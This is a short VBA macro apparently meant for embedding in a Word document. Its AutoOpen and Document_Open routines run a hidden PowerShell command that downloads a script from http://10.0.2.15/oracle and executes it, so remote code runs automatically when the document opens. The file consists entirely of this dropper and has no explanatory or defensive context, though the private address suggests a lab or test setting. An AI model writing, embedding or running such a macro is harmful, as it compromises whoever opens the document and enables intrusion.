Sub Document()
Dim str As String
str = "cmd /c powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.15:80/oracle');"
Shell str
End Sub
Sub Document_Open()
Document
End Sub
Sub AutoOpen()
Document
End Sub
